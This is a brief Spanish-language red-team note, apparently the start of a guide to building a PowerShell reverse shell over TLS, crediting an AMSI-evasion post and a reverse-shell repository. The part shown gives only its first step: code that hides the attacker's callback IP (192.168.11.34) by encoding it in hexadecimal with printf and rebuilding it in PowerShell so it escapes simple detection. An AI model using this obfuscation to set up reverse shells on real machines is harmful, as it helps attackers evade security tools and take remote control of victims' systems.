## **TCP Reverse Shell mediante TLS en Powershell**

Todos los agradecimientos a estos dos enlaces, esto no es más que casi un copia y pega:

https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/

https://github.com/3v4Si0N/HTTP-revshell

**1.- Ofuscar la IP**

Básicamente se trata de crear los valores en hexadecimal:

```
printf "%x,%x,%x,%x\n" 192 168 11 34
c0,a8,b,22
```

```powershell
$px = "c0","a8","b","22"
$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
```
 
